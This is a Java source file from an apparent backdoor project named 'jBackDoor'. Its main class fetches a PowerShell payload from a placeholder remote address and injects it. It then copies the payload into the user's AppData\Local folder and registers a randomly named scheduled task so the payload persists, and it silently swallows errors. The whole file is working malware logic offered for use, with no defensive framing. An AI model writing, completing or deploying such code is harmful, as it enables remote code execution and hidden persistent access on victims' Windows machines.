package jBackDoor.init;

import java.io.File;
import java.io.IOException;
import java.util.UUID;

import jBackDoor.util.BasicPowerShellInj;
import jBackDoor.util.BasicShedulePowerShellCreate;

public class AutoCrowler {
	public static String tmpFileCreated = "";
	public static boolean PERSIST = true;
	public static String shellpayloadScriptPatch = "";
	public static final String URL_SHELL = "http://xxx.xxx.xxx.xxx/payload.txt";

	public static void main(String[] args) {
		try {
			BasicPowerShellInj.injectFromUrl(URL_SHELL);
			DownloadAndCreatepowershellFiles();
			if (!shellpayloadScriptPatch.equals("") && PERSIST) {
				// U can change the job name 
				BasicShedulePowerShellCreate.CreateScheduleByFile(shellpayloadScriptPatch, UUID.randomUUID().toString().split("-") [0]);
			}
		} catch (IOException e) {
		}
	}

	public static void DownloadAndCreatepowershellFiles() {
		tmpFileCreated = BasicPowerShellInj.getPath();
		String[] split = tmpFileCreated.split("\\\\");
		String fileName = split[split.length - 1];
		String appDataPatch = BasicPowerShellInj.getAppDataPatch(new File(tmpFileCreated));
		appDataPatch = appDataPatch + "\\Local\\" + fileName;
		try {
			BasicShedulePowerShellCreate.copyDirectory(new File(tmpFileCreated), new File(appDataPatch));
		} catch (IOException e) {
			// e.printStackTrace();
		}
		shellpayloadScriptPatch = appDataPatch;
	}
}
